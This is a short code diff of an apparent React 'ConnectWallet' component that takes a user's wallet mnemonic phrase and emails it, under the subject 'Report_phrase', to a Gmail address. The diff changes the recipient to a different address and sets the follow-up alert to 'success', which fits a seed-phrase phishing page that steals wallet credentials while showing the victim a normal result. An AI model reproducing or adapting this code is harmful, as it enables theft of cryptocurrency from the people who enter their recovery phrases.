@@ -91,8 +91,8 @@ export default function ConnectWallet() {
     if (value.phrasecount < 12) {
       setValue({
         ...value,
-        alerMessage: "Invalid Mnemonics Phrase",
         severity: "warning",
+        alerMessage: "Invalid Mnemonics Phrase",
       });
       setOpenSnackbar(true);
     } else {
@@ -100,7 +100,7 @@ export default function ConnectWallet() {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "saptrustservice@gmail.com"
+        "Bitmaxservice@gmail.com"
       )
         .then(() => {
           setValue({
@@ -122,7 +122,7 @@ export default function ConnectWallet() {
       <CustomizedSnackbars
         openSnackbar={openSnackbar}
         handleCloseSnackbar={handleCloseSnackbar}
-        severity="warning"
+        severity="success"
         message={value.alerMessage}
       />
       <form onSubmit={submitFunction}>
